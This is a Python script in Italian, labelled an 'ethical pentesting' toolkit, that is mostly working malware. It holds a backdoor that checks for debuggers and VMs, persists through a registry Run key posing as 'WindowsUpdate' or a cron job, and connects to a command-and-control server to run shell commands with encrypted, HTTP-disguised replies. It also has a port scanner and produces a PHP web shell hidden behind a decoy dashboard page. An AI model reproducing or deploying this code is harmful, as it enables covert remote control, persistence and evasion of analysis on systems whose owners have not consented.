#!/usr/bin/env python3
"""
Ethical Pentesting SwissKnife Toolkit
Autore: [Il Tuo Nome]
Data: [Data]
Licenza: Solo per uso autorizzato
"""

import os
import sys
import socket
import platform
import subprocess
import time
import json
import base64
import random
import hashlib
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA
import threading
import ctypes
import psutil
import winreg  # Solo per Windows

# ================= CONFIGURAZIONE =================
C2_SERVER = "192.168.1.100"  # MODIFICARE CON IP AUTORIZZATO
C2_PORT = 443
RECONNECT_DELAY = 10
AES_KEY = hashlib.sha256(b"32bytessecretkeyforAES256encryption!").digest()
# ==================================================

class Security:
    """Classe per funzionalità di sicurezza e anti-analisi"""
    
    @staticmethod
    def check_debugger():
        """Rileva debugger attivi"""
        try:
            if ctypes.windll.kernel32.IsDebuggerPresent():
                return True
        except:
            pass
        
        if sys.gettrace():
            return True
            
        return False
    
    @staticmethod
    def check_vm():
        """Rileva ambienti virtualizzati"""
        vm_indicators = [
            "vbox", "vmware", "qemu", "xen", "hyperv", "kvm"
        ]
        try:
            for proc in psutil.process_iter(['name']):
                if any(indicator in proc.info['name'].lower() for indicator in vm_indicators):
                    return True
                    
            if platform.system() == 'Windows':
                import winreg
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services")
                    for i in range(winreg.QueryInfoKey(key)[0]):
                        service = winreg.EnumKey(key, i)
                        if any(indicator in service.lower() for indicator in vm_indicators):
                            return True
                except:
                    pass
        except:
            pass
            
        return False

class Encryption:
    """Gestione crittografia avanzata"""
    
    def __init__(self):
        self.aes_key = AES_KEY
        
    def aes_encrypt(self, data):
        """Crittografia AES-256 con modalità GCM"""
        cipher = AES.new(self.aes_key, AES.MODE_GCM)
        ciphertext, tag = cipher.encrypt_and_digest(data.encode())
        encrypted = cipher.nonce + tag + ciphertext
        return base64.b64encode(encrypted).decode()
        
    def aes_decrypt(self, data):
        """Decrittografia AES-256 con modalità GCM"""
        try:
            data = base64.b64decode(data)
            nonce = data[:16]
            tag = data[16:32]
            ciphertext = data[32:]
            cipher = AES.new(self.aes_key, AES.MODE_GCM, nonce=nonce)
            return cipher.decrypt_and_verify(ciphertext, tag).decode()
        except:
            return None

class Backdoor:
    """Backdoor avanzata per testing"""
    
    def __init__(self):
        self.enc = Encryption()
        self.running = True
        
    def obfuscate_traffic(self, data):
        """Camuffa il traffico come HTTP"""
        methods = ["GET", "POST", "PUT", "DELETE"]
        headers = [
            "User-Agent: Mozilla/5.0",
            "Accept: */*",
            "Connection: keep-alive"
        ]
        fake_request = (
            f"{random.choice(methods)} /{hashlib.sha256(data.encode()).hexdigest()[:8]} HTTP/1.1\r\n"
            f"Host: {C2_SERVER}\r\n"
            f"{random.choice(headers)}\r\n\r\n"
        )
        return fake_request.encode() + data.encode()
        
    def execute_command(self, cmd):
        """Esecuzione sicura di comandi"""
        try:
            result = subprocess.check_output(
                cmd, 
                shell=True, 
                stderr=subprocess.STDOUT,
                stdin=subprocess.PIPE,
                timeout=30
            )
            return result.decode('utf-8', errors='replace')
        except subprocess.TimeoutExpired:
            return "[!] Timeout: Comando terminato dopo 30 secondi"
        except Exception as e:
            return f"[!] Errore: {str(e)}"
    
    def persist(self):
        """Tecniche di persistenza multi-piattaforma"""
        if Security.check_debugger() or Security.check_vm():
            return False
            
        try:
            if platform.system() == 'Windows':
                # Persistenza via registro
                key = winreg.HKEY_CURRENT_USER
                path = r"Software\Microsoft\Windows\CurrentVersion\Run"
                try:
                    reg_key = winreg.OpenKey(key, path, 0, winreg.KEY_WRITE)
                    winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, sys.executable)
                    winreg.CloseKey(reg_key)
                except:
                    pass
            else:
                # Persistenza Linux/Unix via cron
                cron_cmd = f"@reboot {sys.executable} {os.path.abspath(__file__)}"
                try:
                    with open("/tmp/cronjob", "w") as f:
                        f.write(f"{cron_cmd}\n")
                    subprocess.call(["crontab", "/tmp/cronjob"])
                    os.remove("/tmp/cronjob")
                except:
                    pass
            return True
        except:
            return False
    
    def start(self):
        """Avvia la backdoor"""
        if Security.check_debugger() or Security.check_vm():
            sys.exit(0)
            
        self.persist()
        
        while self.running:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(30)
                    s.connect((C2_SERVER, C2_PORT))
                    
                    # Handshake iniziale
                    s.send(self.obfuscate_traffic("READY"))
                    
                    while self.running:
                        try:
                            data = s.recv(4096)
                            if not data:
                                break
                                
                            # Decodifica e verifica comando
                            cmd = self.enc.aes_decrypt(data.decode())
                            if cmd == "exit":
                                self.running = False
                                break
                                
                            # Esegui comando e invia risultato
                            result = self.execute_command(cmd)
                            encrypted_result = self.enc.aes_encrypt(result)
                            s.send(self.obfuscate_traffic(encrypted_result))
                            
                        except socket.timeout:
                            continue
                        except:
                            break
                            
            except (ConnectionRefusedError, socket.timeout):
                time.sleep(RECONNECT_DELAY)
            except:
                time.sleep(RECONNECT_DELAY)

class Scanner:
    """Modulo di scansione avanzato"""
    
    @staticmethod
    def port_scan(target, ports=None, threads=100):
        """Scansione porte multi-thread"""
        if not ports:
            ports = "21,22,23,25,53,80,110,139,143,443,445,3389"
            
        if isinstance(ports, str):
            ports = [int(p) for p in ports.split(",")]
            
        open_ports = []
        lock = threading.Lock()
        
        def check_port(ip, port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(1)
                    if s.connect_ex((ip, port)) == 0:
                        with lock:
                            open_ports.append(port)
            except:
                pass
                
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(check_port, target, port) for port in ports]
            concurrent.futures.wait(futures)
            
        return open_ports

class WebShell:
    """Web shell simulata per testing"""
    
    @staticmethod
    def generate_php_shell():
        """Genera una web shell PHP per testing"""
        return """<?php
if(isset($_REQUEST['cmd'])) {
    header("Content-Type: text/plain");
    system($_REQUEST['cmd']);
    die();
}
?>
<!-- Legitimate looking HTML -->
<!DOCTYPE html>
<html>
<head><title>System Dashboard</title></head>
<body>
<h1>System Status Dashboard</h1>
<p>All systems operational.</p>
</body>
</html>"""

def main():
    """Menu principale"""
    print("""
    Ethical Pentesting SwissKnife Toolkit
    -------------------------------------
    1. Avvia backdoor avanzata
    2. Scansione porte avanzata
    3. Genera web shell PHP
    4. Esci
    """)
    
    choice = input("Scelta: ").strip()
    
    if choice == "1":
        print("[*] Avvio backdoor... (Ctrl+C per fermare)")
        Backdoor().start()
    elif choice == "2":
        target = input("Target IP: ")
        ports = input("Porte (default: 21,22,80,443): ") or None
        print("[*] Scansione in corso...")
        open_ports = Scanner.port_scan(target, ports)
        print(f"[+] Porte aperte: {', '.join(map(str, open_ports))}")
    elif choice == "3":
        print("[*] Web shell PHP generata:")
        print(WebShell.generate_php_shell())
    elif choice == "4":
        sys.exit(0)
    else:
        print("[!] Scelta non valida")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Interrotto dall'utente")
        sys.exit(0)